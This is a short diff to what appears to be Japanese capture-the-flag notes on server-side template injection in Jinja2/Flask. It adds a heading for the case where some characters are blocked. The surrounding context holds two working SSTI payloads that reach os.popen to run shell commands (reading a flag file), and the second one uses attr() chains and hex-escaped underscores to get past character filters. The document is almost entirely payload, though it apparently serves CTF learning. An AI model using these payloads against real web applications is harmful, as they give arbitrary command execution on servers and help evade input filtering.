@@ -10,6 +10,7 @@ SSTIができる時には、
 {{request.application.__globals__.__builtins__.__import__('os').popen('cat flags').read()}}
 ```
 
+使えない文字がある場合
 ```Python:SSTI_payload2
 {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
 ```
